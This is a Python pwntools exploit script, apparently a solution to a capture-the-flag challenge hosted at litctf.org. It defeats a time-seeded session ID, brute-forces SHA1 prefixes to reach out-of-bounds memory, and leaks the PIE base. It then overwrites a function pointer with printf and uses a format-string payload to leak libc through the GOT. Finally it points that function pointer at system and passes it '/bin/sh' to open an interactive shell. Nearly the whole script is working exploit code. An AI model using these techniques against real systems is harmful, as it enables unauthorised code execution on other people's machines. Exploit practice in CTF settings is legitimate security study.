#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
import hashlib, string, itertools

exe = context.binary = ELF('x')
LIBC = CDLL('libc.so.6')
libc = ELF('libc.so.6')

host = args.HOST or 'litctf.org'
port = int(args.PORT or 31778)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def lookup(msg):
    io.sendlineafter(b'$ ', b'lookup')
    io.sendlineafter(b'Key (e.g. Leo\'s Birthday):\n',msg)

def help():
    io.sendlineafter(b'$ ', b'help')

def store(msg, data):
    io.sendlineafter(b'$ ', b'store')
    io.sendlineafter(b'Key (e.g. Leo\'s Birthday):\n',msg)
    io.sendlineafter(b'Value (e.g. 07/22/2020):\n',data)

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def proof_of_work(wanted):
    wanted = tohex(wanted, 16)[2:]
    print(wanted)
    characters = string.printable
    for length in range(1, 10):
        for character in itertools.product(characters, repeat=length):
            text = "".join(character)
            hash = hashlib.sha1(text.encode()).hexdigest()

            if hash.startswith(wanted):
                print(text, hash)
                return text
context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
#b *main+212
b *executeCommand+170
b *printf
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

"""
Available commands: 
- lookup: display memory at hash location
- store: write memory at hash location
- help
- info
- checkPrintable (non collable)
- exit
"""

##################
# Get Session ID #
##################
LIBC.srand(LIBC.time())
session_id = LIBC.rand()
io.recvuntil(b'Session ID is: ')
test = int(io.recvline(),16)
if not args.GDB:
    assert test == session_id, f"Error in timezone: {test} {session_id}"

#####################
# Leak PIE (lookup) #
#####################
lookup(proof_of_work(-0x7ff8))
io.recvuntil(b': ')
leak = u64(io.recvline().strip().ljust(8,b'\0'))
exe.address = leak - exe.sym['_store']
log.success(f'PIE leak: 0x{leak:x} {exe.address = :x}')

# overwrite checkPrintable
print(hex(exe.plt['printf'] & 0Xffff))
store(proof_of_work(-0x8000 + (0X8*4)), p16(exe.plt['printf'] & 0Xffff))

###################
# Leak libc (fmt) #
###################
lookup(b'%17$sAAA' + p64(exe.got['puts']))
io.recvline()
leak = u64(io.recv(6).ljust(8,b'\0'))
libc.address = leak - libc.sym['puts']
print("Libc leak",hex(leak))
log.success(f'{libc.address = :x}')

# overwrite checkPrintable
store(proof_of_work(-0x8000 + (0X8*4)), p64(libc.sym['system']))

# get shell
lookup(b'/bin/sh')

io.interactive()

